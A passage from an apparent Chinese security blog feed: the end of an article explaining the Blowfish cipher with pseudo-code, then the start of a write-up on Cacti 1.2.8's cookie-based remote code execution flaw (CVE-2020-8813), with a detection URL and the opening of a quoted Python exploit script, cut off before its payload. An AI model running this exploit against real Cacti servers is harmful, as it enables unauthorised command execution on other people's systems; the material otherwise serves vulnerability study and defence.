389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>。</p>
</li>
<li><p>  使用更新后的P数组和S盒加密步骤4输出的数据，替代<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="5.886ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 2601.8 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1523.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container>。</p>
</li>
<li><p>  依次加密9轮生成新的P数组<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="14.167ex" height="1.984ex" role="img" focusable="false" viewBox="0 -683 6261.9 877"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1078.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1523.2,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mn" transform="translate(675,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2601.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mo" transform="translate(3046.4,0)"><path data-c="2026" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60ZM525 60Q525 84 542 102T585 120Q609 120 627 104T646 61Q646 36 629 18T586 0T543 17T525 60ZM972 60Q972 84 989 102T1032 120Q1056 120 1074 104T1093 61Q1093 36 1076 18T1033 0T990 17T972 60Z"></path></g><g data-mml-node="mo" transform="translate(4385.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4829.8,0)"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="TeXAtom" transform="translate(675,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>。</p>
</li>
<li><p>  新的S盒数据也按照上述流程生成。</p>
</li>
</ol>
<p>故生成最终的P数组和S盒共需要加密<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="27.655ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 12223.3 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z" transform="translate(1000,0)"></path></g><g data-mml-node="mo" transform="translate(1722.2,0)"><path data-c="D7" d="M630 29Q630 9 609 9Q604 9 587 25T493 118L389 222L284 117Q178 13 175 11Q171 9 168 9Q160 9 154 15T147 29Q147 36 161 51T255 146L359 250L255 354Q174 435 161 449T147 471Q147 480 153 485T168 490Q173 490 175 489Q178 487 284 383L389 278L493 382Q570 459 587 475T609 491Q630 491 630 471Q630 464 620 453T522 355L418 250L522 145Q606 61 618 48T630 29Z"></path></g><g data-mml-node="mn" transform="translate(2722.4,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(3944.7,0)"><path data-c="F7" d="M318 466Q318 500 339 518T386 537Q418 537 438 517T458 466Q458 438 440 417T388 396Q355 396 337 417T318 466ZM56 237T56 250T70 270H706Q721 262 721 250T706 230H70Q56 237 56 250ZM318 34Q318 68 339 86T386 105Q418 105 438 85T458 34Q458 6 440 -15T388 -36Q355 -36 337 -15T318 34Z"></path></g><g data-mml-node="mn" transform="translate(4944.9,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(5667.1,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(6667.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="38" d="M70 417T70 494T124 618T248 666Q319 666 374 624T429 515Q429 485 418 459T392 417T361 389T335 371T324 363L338 354Q352 344 366 334T382 323Q457 264 457 174Q457 95 399 37T249 -22Q159 -22 101 29T43 155Q43 263 172 335L154 348Q133 361 127 368Q70 417 70 494ZM286 386L292 390Q298 394 301 396T311 403T323 413T334 425T345 438T355 454T364 471T369 491T371 513Q371 556 342 586T275 624Q268 625 242 625Q201 625 165 599T128 534Q128 511 141 492T167 463T217 431Q224 426 228 424L286 386ZM250 21Q308 21 350 55T392 137Q392 154 387 169T375 194T353 216T330 234T301 253T274 270Q260 279 244 289T218 306L210 311Q204 311 181 294T133 239T107 157Q107 98 150 60T250 21Z" transform="translate(500,0)"></path></g><g data-mml-node="mo" transform="translate(7889.6,0)"><path data-c="F7" d="M318 466Q318 500 339 518T386 537Q418 537 438 517T458 466Q458 438 440 417T388 396Q355 396 337 417T318 466ZM56 237T56 250T70 270H706Q721 262 721 250T706 230H70Q56 237 56 250ZM318 34Q318 68 339 86T386 105Q418 105 438 85T458 34Q458 6 440 -15T388 -36Q355 -36 337 -15T318 34Z"></path></g><g data-mml-node="mn" transform="translate(8889.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(9667.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(10723.3,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(1000,0)"></path></g></g></g></svg></mjx-container>次。</p>
<p>由此可见Blowfish初始化需要大量的计算，但是一旦初始化完毕，或者说密钥不变的情况下，相对于 DES算法Blowfish是一种快速的分组加密方法，因此Blowfish一般用于密钥不经常变化的应用程序中，比如通信链路或自动文件加密器。</p>
<h1 id="伪代码实现"><a href="#伪代码实现" class="headerlink" title="伪代码实现"></a>伪代码实现</h1><p>根据Blowfish加密流程，编写伪代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">uint32_t</span> P[<span class="number">18</span>];</span><br><span class="line"><span class="type">uint32_t</span> S[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">f</span> <span class="params">(<span class="type">uint32_t</span> x)</span> {</span><br><span class="line">   <span class="type">uint32_t</span> h = S[<span class="number">0</span>][x &gt;&gt; <span class="number">24</span>] + S[<span class="number">1</span>][x &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>];</span><br><span class="line">   <span class="keyword">return</span> ( h ^ S[<span class="number">2</span>][x &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span>] ) + S[<span class="number">3</span>][x &amp; <span class="number">0xff</span>];</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">encrypt</span> <span class="params">(<span class="type">uint32_t</span> &amp; L, <span class="type">uint32_t</span> &amp; R)</span> {</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">16</span> ; i += <span class="number">2</span>) {</span><br><span class="line">      L ^= P[i];</span><br><span class="line">      R ^= f(L);</span><br><span class="line">      R ^= P[i+<span class="number">1</span>];</span><br><span class="line">      L ^= f(R);</span><br><span class="line">   }</span><br><span class="line">   L ^= P[<span class="number">16</span>];</span><br><span class="line">   R ^= P[<span class="number">17</span>];</span><br><span class="line">   swap (L, R);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span> <span class="params">(<span class="type">uint32_t</span> &amp; L, <span class="type">uint32_t</span> &amp; R)</span> {</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">16</span> ; i &gt; <span class="number">0</span> ; i -= <span class="number">2</span>) {</span><br><span class="line">      L ^= P[i+<span class="number">1</span>];</span><br><span class="line">      R ^= f(L);</span><br><span class="line">      R ^= P[i];</span><br><span class="line">      L ^= f(R);</span><br><span class="line">   }</span><br><span class="line">   L ^= P[<span class="number">1</span>];</span><br><span class="line">   R ^= P[<span class="number">0</span>];</span><br><span class="line">   swap (L, R);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// initializing the P-array and S-boxes with values derived from pi; omitted in the example</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">{</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">18</span> ; ++i)</span><br><span class="line">      P[i] ^= key[i % keylen];</span><br><span class="line">   <span class="type">uint32_t</span> L = <span class="number">0</span>, R = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">18</span> ; i+=<span class="number">2</span>) {</span><br><span class="line">      encrypt (L, R);</span><br><span class="line">      P[i] = L; P[i+<span class="number">1</span>] = R;</span><br><span class="line">   }</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">4</span> ; ++i)</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> j=<span class="number">0</span> ; j&lt;<span class="number">256</span>; j+=<span class="number">2</span>) {</span><br><span class="line">         encrypt (L, R);</span><br><span class="line">         S[i][j] = L; S[i][j+<span class="number">1</span>] = R;</span><br><span class="line">      }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h1 id="Blowfish优缺点"><a href="#Blowfish优缺点" class="headerlink" title="Blowfish优缺点"></a>Blowfish优缺点</h1><p>优：</p>
<ol>
<li>  每个新的密钥都需要进行约4 KB文本的预处理，和其他分组密码算法相比，初始化相对较慢。但对于一个正常应用来说，不会经常更换密钥，所以预处理一般只会生成一次。</li>
<li>  而对于恶意攻击者来说，每次尝试新的密钥都需要进行漫长的预处理，所以对攻击者来说要破解blowfish算法是非常不划算的。所以认为blowfish是可以抵御字典攻击的。</li>
</ol>
<p>缺：</p>
<ol>
<li>  Blowfish使用64bits分组（与AES的128bits分组相比）容易受到生日攻击。 2016年，SWEET32攻击演示了如何利用生日攻击对64bits分组大小的密码执行纯文本恢复。</li>
<li>  因为Blowfish的分组只有64bits，比较小，所以GnuPG项目建议不要使用Blowfish来加密大于4 GB的文件。</li>
<li>  Blowfish如果只进行一轮加密的话，容易受到反射性弱键的已知明文攻击。 实现时使用的是16轮加密，不容易受到这种攻击。但是Blowfish的发明人Bruce Schneier仍然建议迁移到Blowfish的继承者Twofish。</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>Cacti漏洞集合</title>
    <url>/Cacti%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88.html</url>
    <content><![CDATA[<h2 id="【CVE-2020-8813】Cacti-v1-2-8远程代码执行漏洞"><a href="#【CVE-2020-8813】Cacti-v1-2-8远程代码执行漏洞" class="headerlink" title="【CVE-2020-8813】Cacti v1.2.8远程代码执行漏洞"></a>【CVE-2020-8813】Cacti v1.2.8远程代码执行漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Cacti是一套基于PHP,MySQL,SNMP及RRDTool开发的网络流量监测图形分析工具。</p>
<p>Cacti 1.2.8版本中的graph_realtime.php文件存在安全漏洞。远程攻击者可借助cookie中的shell元字符利用该漏洞执行任意操作系统命令。</p>
<span id="more"></span>

<h3 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h3><p>Cacti 1.2.8</p>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞点在登录的<code>Cookie</code>变量<code>Cacti</code>的值，将其改为系统命令造成RCE；</p>
<p>但是操作Cookie值会遇到身份验证问题，因此有两种利用方式：</p>
<ul>
<li>先进行用户登录，后更改cookie值实现</li>
<li>需要系统开启访客模式，之后更改cookie值实现</li>
</ul>
<p>漏洞判断：</p>
<ul>
<li>先进行登录或者系统开起了访客模式</li>
<li>访问URL：<code>/graph_realtime.php?action=init</code>，如果返回结果中存在<code>poller_realtime.php</code>字样，则说明存在漏洞。</li>
</ul>
<p>从github上找到两个POC如下：</p>
<ul>
<li><p>POC1，需要账号登录认证</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Cacti v1.2.8 Remote Code Execution</span></span><br><span class="line"><span class="comment"># Date: 03/02/2020</span></span><br><span class="line"><span class="comment"># Exploit Author: Askar (@mohammadaskar2)</span></span><br><span class="line"><span class="comment"># CVE: CVE-2020-8813</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://cacti.net/</span></span><br><span class="line"><span class="comment"># Version: v1.2.8</span></span><br><span class="line"><span class="comment"># Tested on: CentOS 7.3 / PHP 7.1.33</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">warnings.filterwarnings(<span class="string">"ignore"</span>, category=UserWarning, module=<span class="string">'bs4'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">6</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">"[~] Usage : ./Cacti-exploit.py url username password ip port"</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">username = sys.argv[<span class="number">2</span>]</span><br><span class="line">password = sys.argv[<span class="number">3</span>]</span><br><span class="line">ip = sys.argv[<span class="number">4</span>]</span><br><span class="line">port = sys.argv[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">token</span>):</span><br><span class="line">    login_info = {</span><br><span class="line">    <span class="string">"login_username"</span>: username,</span><br><span class="line">    <span class="string">"login_password"</span>: password,</span><br><span class="line">    <span class="string">"action"</span>: <span class="string">"login"</span>,</span><br><span class="line">    <span class="string">"__csrf_magic"</span>: token</span><br><span class="line">    }</span><br><span class="line">    login_request = request.post(url+<span class="string">"/index.php"</span>, login_info)</span><br><span class="line">    login_text = login_request.text</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Invalid User Name/Password Please Retype"</span> <span class="keyword">in</span> login_text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enable_guest</span>(<span class="params">token</span>):</span><br><span 